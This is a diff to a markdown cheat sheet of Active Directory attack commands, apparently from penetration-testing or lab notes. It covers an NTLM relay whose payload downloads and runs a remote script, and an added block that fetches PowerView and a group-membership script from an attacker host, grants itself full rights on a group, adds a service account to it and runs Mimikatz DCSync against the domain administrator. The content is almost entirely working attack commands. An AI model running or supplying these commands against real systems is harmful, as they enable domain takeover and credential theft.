@@ -3,7 +3,6 @@
 ## NTLM Relay
 ```powershell
 sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.216.152 -c 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -c iex(iwr -useb http://192.168.45.185/run.txt)'
-
 ```
 
 ## BloodHound
@@ -14,6 +13,17 @@ Invoke-Bloodhound -CollectionMethod All -Domain XXX.local -ZipFileName loot.zip
 ```
 
 ## AD Object Security Permission
+
+### Write DACL & Add Group Member
+```powershell
+(new-object system.net.webclient).downloadstring('http://192.168.45.185/powerview.txt') | IEX
+Add-DomainObjectAcl -TargetIdentity "MailAdmins" -Rights All -PrincipalIdentity 'sqlsvc' -Verbose
+(new-object system.net.webclient).downloadstring('http://192.168.45.185/Add-NetGroupUser.ps1') | IEX
+Add-NetGroupUser -UserName SQLSVC -GroupName "MAILADMINS" -Domain "TRICKY.COM"
+Invoke-Mimikatz -Command ' "kerberos::purge" "lsadump::dcsync /domain:tricky.com /user:tricky\administrator" '
+```
+
+
 ### Check Generic All
 **Logic**: Use GenericAll permission → modify related password to gain access
 ```powershell
